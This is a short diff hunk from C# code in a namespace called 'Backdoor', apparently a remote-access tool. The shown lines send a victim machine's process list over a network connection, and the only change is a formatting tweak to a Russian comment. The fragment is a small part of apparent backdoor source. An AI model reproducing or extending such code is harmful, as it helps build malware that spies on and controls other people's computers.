@@ -169,7 +169,7 @@ namespace Backdoor
                     var pmsg = Encoding.UTF8.GetBytes(tasks);//"Все процессы в системе: " + "\r\n " + tasks + " ");
                     if (pmsg.Length > 9999) Array.Resize(ref pmsg, 9999);
                     conn.Send(pmsg);
-                    data = "";//чтобы система не упала
+                    data = ""; //чтобы система не упала
                     continue;
                 }
 
